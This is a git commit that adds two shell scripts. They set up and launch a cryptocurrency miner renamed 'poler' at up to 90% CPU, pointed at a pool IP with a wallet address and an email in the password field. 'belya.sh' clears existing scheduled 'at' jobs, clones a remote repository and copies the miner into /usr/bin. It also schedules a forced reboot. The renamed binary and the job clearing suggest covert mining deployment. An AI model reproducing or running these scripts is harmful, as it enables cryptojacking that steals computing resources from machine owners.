61271c8c9dc72d7cb3fb8ba76e3d8f49fe99b912
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-12 06:43:46 +0300

    w15

---
+++ 80.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 90 --cpu-priority 4 -o 185.251.38.181:6002 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w15-ekonomka:ivanovandrey1984g@gmail.com -k
---
+++ belya.sh
@@ -0,0 +1,32 @@
+#!/bin/bash
+
+rm -rf /tmp/ekonomka/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir ekonomka
+git clone https://github.com/masketteland/ekonomka.git /tmp/ekonomka
+cd /tmp/ekonomka
+chmod +x /tmp/ekonomka/poler
+chmod 777 ./*.sh
+cp /tmp/ekonomka/poler /usr/bin/
+sleep 3
+
+sudo apt-get install dos2unix
+sudo dos2unix time1.sh
+sudo dos2unix 75.sh
+sudo dos2unix 50.sh
+sudo dos2unix 80.sh
+sudo dos2unix 65.sh
+sudo dos2unix 90.sh
+sudo dos2unix 40.sh
+
+touch /tmp/at.txt
+chmod +x /tmp/at.txt
+echo 'sudo systemctl reboot -f' >> /tmp/at.txt
+sudo at now + 8 hours < /tmp/at.txt
+
+sudo ./time1.sh
